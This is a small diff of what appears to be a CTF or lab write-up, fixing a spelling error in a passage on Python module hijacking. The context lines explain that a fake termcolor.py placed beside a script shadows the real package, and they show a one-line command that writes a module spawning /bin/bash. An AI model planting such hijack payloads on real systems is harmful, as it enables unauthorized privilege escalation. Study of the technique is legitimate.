@@ -138,7 +138,7 @@ if __name__ == '__main__': main()```
 Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation *ullamco laboris* nisi ut aliquip ex ea commodo consequat.
 ```
 
-Termcolor in not a default package in python, so if we crate a file names termcolor.py in the same directory python will run our file instade of the package files. Let's try this.
+Termcolor in not a default package in python, so if we create a file names termcolor.py in the same directory python will run our file instade of the package files. Let's try this.
 
 ```echo "import os;os.system('/bin/bash')" > /home/chief/termcolor.py```
 
